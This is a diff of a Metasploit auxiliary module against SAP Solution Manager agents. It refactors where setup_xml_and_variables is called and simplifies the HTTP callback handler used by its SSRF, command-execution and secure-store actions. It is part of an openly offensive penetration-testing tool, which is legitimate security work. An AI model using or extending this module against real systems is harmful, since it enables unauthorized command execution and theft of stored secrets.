@@ -107,10 +107,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Handle incoming HTTP requests from connected agents
-  def on_request_uri(cli, request, script_name)
-    setup_xml_and_variables
-    @script_name = script_name
-
+  def on_request_uri(cli, request)
     response = create_response(200, 'OK')
     response.body = 'Received'
     cli.send_response(response)
@@ -176,6 +173,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    setup_xml_and_variables
     case action.name
     when 'LIST'
       action_list
@@ -191,8 +189,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_list
-    setup_xml_and_variables
-
     print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
     agents = make_agents_array
 
@@ -205,7 +201,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_ssrf
-    setup_xml_and_variables
     check_agent(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
@@ -225,7 +220,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_exec
-    setup_xml_and_variables
     check_agent(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
@@ -245,7 +239,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_secstore
-    setup_xml_and_variables
     agent = check_agent(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
@@ -254,7 +247,7 @@ class MetasploitModule < Msf::Auxiliary
     start_service(
       {
         'Uri' => {
-          'Proc' => proc { |cli, req| on_request_uri(cli, req, @script_name) },
+          'Proc' => proc { |cli, req| on_request_uri(cli, req) },
           'Path' => "/#{@script_name}"
         }
       }
